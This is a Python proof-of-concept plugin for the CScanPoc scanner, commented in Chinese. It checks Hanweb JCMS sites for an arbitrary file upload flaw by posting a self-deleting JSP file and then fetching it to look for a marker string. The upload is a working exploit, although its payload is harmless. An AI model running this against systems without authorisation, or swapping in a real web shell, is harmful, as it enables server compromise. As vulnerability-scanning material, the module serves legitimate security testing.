# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re


class Vuln(ABVuln):
    vuln_id = 'Hanweb_0000'  # 平台漏洞编号，留空
    name = '大汉JCMS /opr_import_discussion.jsp 任意文件上传漏洞*'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD  # 漏洞类型
    disclosure_date = '2014-12-05'  # 漏洞公布时间
    desc = '''
        大汉科技（Hanweb）JCMS http://127.0.0.1/jcms/m_5_e/module/idea/opr_import_discussion.jsp?typeid=0&fn_billstatus=S
        可上传文件,未限制上传文件类型,导致任意文件上传漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=075585'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Hanweb(大汉)'  # 漏洞应用名称
    product_version = '大汉JCMS'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c68e0c19-2421-41a6-ab6a-25cbf3dc2271'
    author = '国光'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            verify_url = '{target}'.format(
                target=self.target)+"/jcms/jcms_files/jcms/web0/site/module/idea/tem/upload/v.jsp"
            target_url = '{target}'.format(
                target=self.target)+"/jcms/m_5_e/module/idea/opr_import_discussion.jsp?typeid=0&fn_billstatus=S"
            file_v_jsp = '''<%@ page import="java.util.*,java.io.*" %>
                <%@ page import="java.io.*"%>
                <%
                String path=application.getRealPath(request.getRequestURI());
                File d=new File(path);
                out.println(path);
                if(d.exists()){
                d.delete();
                }
                %>
                <% out.println("00799a96dcc29282dd74e23e49b647a6a");%>
            '''
            files = {'file': ('v.jsp', file_v_jsp, 'multipart/form-data')}

            response = requests.post(target_url, files=files)  # 上传
            response = requests.get(verify_url)  # 验证
            content = response.text
            if '00799a96dcc29282dd74e23e49b647a6a' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
